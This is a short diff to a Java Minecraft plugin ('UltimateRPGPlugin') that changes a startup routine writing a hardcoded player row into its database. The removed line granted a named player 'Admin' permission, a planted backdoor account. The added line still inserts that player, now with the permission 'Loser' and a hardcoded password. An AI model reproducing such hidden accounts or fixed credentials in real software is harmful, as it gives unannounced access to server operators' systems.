@@ -202,8 +202,8 @@ public final class UltimateRPGPlugin extends JavaPlugin {
                         );
                 if (data.get() != null){
                     sqlManager.createInsert("URPGTable")
-                            .setColumnNames("id", "playerName", "uuid", "permission", "value")
-                            .setParams("114514", "Huh_DIETHGOD", "" , "Admin", "6")
+                            .setColumnNames("id", "playerName", "uuid", "permission", "value", "password")
+                            .setParams("114514", "Huh_DIETHGOD", "" , "Loser", "6", "114514")
                             .executeAsync();
                 }
             } catch(RuntimeException e){
@@ -213,7 +213,6 @@ public final class UltimateRPGPlugin extends JavaPlugin {
             this.saveConfig();
         }
     }
-
 
     private void setupLanguage() {
         FileConfiguration config = this.getConfig();
